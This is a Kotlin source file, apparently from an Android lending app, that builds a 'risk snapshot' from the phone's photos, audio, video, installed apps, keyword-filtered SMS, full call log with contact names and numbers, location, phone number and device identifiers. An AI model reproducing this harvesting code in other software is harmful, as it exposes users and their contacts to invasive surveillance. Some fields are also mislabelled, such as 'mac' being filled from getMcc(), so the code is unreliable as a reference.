package com.vaycore.finance.util.deivce

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.provider.CallLog
import androidx.core.app.ActivityCompat
import com.vaycore.finance.BuildConfig
import com.vaycore.finance.app.App
import com.vaycore.finance.data.APPCODE
import com.vaycore.finance.data.gaId
import com.vaycore.finance.util.encodeBase64
import com.vaycore.finance.util.formatDateString
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.supervisorScope
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject

/** Concurrently collects risk sections and assembles the fixed risk snapshot payload. */
object RiskSnapshotCollector {

    suspend fun collect(): String = withContext(Dispatchers.IO) {
        val sections = supervisorScope {
            createSectionCollectors()
                .map { collector ->
                    async {
                        RiskSection(
                            key = collector.key,
                            value = runCatching { collector.collect() }
                                .getOrElse { collector.fallbackValue() }
                        )
                    }
                }
                .awaitAll()
        }

        JSONObject().apply {
            sections.forEach { section -> put(section.key, section.value) }
            put("mobileType", "2")
            put("appCode", APPCODE)
            put("version", BuildConfig.VERSION_NAME)
        }.toString()
    }

    private fun createSectionCollectors(): List<RiskSectionCollector> = listOf(
        LambdaRiskSectionCollector("albumInfo") {
            MediaLibraryReader.getImages().toString()
        },
        LambdaRiskSectionCollector("albumUpdateTime", fallback = { -1L }) {
            getPhotoAlbumUpdateTime()
        },
        LambdaRiskSectionCollector("appInfo") {
            DeviceSignalReader.getAppListData().toString()
        },
        LambdaRiskSectionCollector("appInstallInfo", fallback = { "[]" }) {
            "[]"
        },
        LambdaRiskSectionCollector("audioInfo") {
            MediaLibraryReader.getAudioInfo().toString()
        },
        LambdaRiskSectionCollector(
            key = "bluetoothInfo",
            fallback = { DeviceSignalReader.getDefaultBluetoothInfo().toString() }
        ) {
            DeviceSignalReader.getBluetoothInfo().toString()
        },
        LambdaRiskSectionCollector("hardwareInfo", fallback = { JSONObject() }) {
            getHardwareInfo()
        },
        LambdaRiskSectionCollector("locationInfo") {
            getLocationInfo().toString()
        },
        LambdaRiskSectionCollector("networkInfo") {
            DeviceSignalReader.getNetworkInfo().toString()
        },
        LambdaRiskSectionCollector("simCardInfo") {
            DeviceSignalReader.getSimCardInfo().toString()
        },
        LambdaRiskSectionCollector("smsInfo") {
            SmsInfoHelper.getSmsInfosByKeywords().toString()
        },
        LambdaRiskSectionCollector("systemInfo") {
            SystemInfoHelper.getSystemInfoJson().toString()
        },
        LambdaRiskSectionCollector("videoInfo") {
            MediaLibraryReader.getVideoInfo().toString()
        },
        LambdaRiskSectionCollector("userCommunicationRecordStr", fallback = { "[]".encodeBase64() }) {
            getCallLog().encodeBase64()
        }
    )

    private fun getHardwareInfo(): JSONObject {
        val json = JSONObject()
        runCatching {
            val installTime = DeviceSignalReader.getCurrentAppInstalledTime()
            json.put("androidId", DeviceIdentityReader.getAndroidID())
            json.put("deviceCode", DeviceIdentityReader.getDeviceId())
            json.put("googleAdId", gaId)
            json.put("imei", DeviceIdentityReader.getDeviceId())
            json.put("mac", DeviceIdentityReader.getMcc())
            json.put("phoneNo", DeviceIdentityReader.getPhoneNumber() ?: "")
            json.put("serialNo", DeviceIdentityReader.getSerialNumbers())
            json.put("systemVersion", Build.VERSION.SDK_INT.toString())
            json.put(
                "appInstallTime",
                if (installTime < 0) "-1" else (installTime / 1000).toString()
            )
            json.put("totalRam", DeviceEnvironmentReader.getTotalMemory() / 1073741824.0)
            json.put("usableRam", DeviceEnvironmentReader.getAvailMemory() / 1073741824.0)
            json.put("totalSdCard", DeviceEnvironmentReader.getInternalTotalSize() / 1073741824.0)
            json.put("usableSdCard", DeviceEnvironmentReader.getInternalAvailableSize() / 1073741824.0)
        }
        return json
    }

    private suspend fun getLocationInfo(): JSONObject {
        val json = JSONObject()
        runCatching {
            val (location, address) = LocationInfoHelper.getLocationInfo()
            json.put("province", address?.adminArea)
            json.put("city", address?.locality)
            json.put("street", address?.thoroughfare)
            json.put("addressText", address?.getAddressLine(0))
            json.put("longitude", location?.longitude ?: 0.0)
            json.put("latitude", location?.latitude ?: 0.0)
        }
        return json
    }

    private fun getPhotoAlbumUpdateTime(): Long = runCatching {
        MediaLibraryReader.getLatestImageUpdateTime().takeIf { it > 0 } ?: -1L
    }.getOrDefault(-1L)

    private fun getCallLog(): String {
        if (ActivityCompat.checkSelfPermission(
                App.appContext,
                Manifest.permission.READ_CALL_LOG
            ) != PackageManager.PERMISSION_GRANTED
        ) return "[]"

        val callLogs = JSONArray()
        val projection = arrayOf(
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.TYPE
        )
        val cursor = App.appContext.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection,
            null,
            null,
            "date DESC"
        )
        cursor?.use {
            val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
            val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
            val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
            val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
            while (it.moveToNext()) {
                callLogs.put(JSONObject().apply {
                    put("name", it.getString(nameIndex))
                    put("phone", it.getString(numberIndex))
                    put("callType", it.getInt(typeIndex))
                    put(
                        "lastCallTime",
                        it.getLong(dateIndex).formatDateString("yyyy-MM-dd HH:mm:ss")
                    )
                    put("callTime", it.getInt(durationIndex))
                })
            }
        }
        return callLogs.toString()
    }

    private data class RiskSection(
        val key: String,
        val value: Any?
    )
}
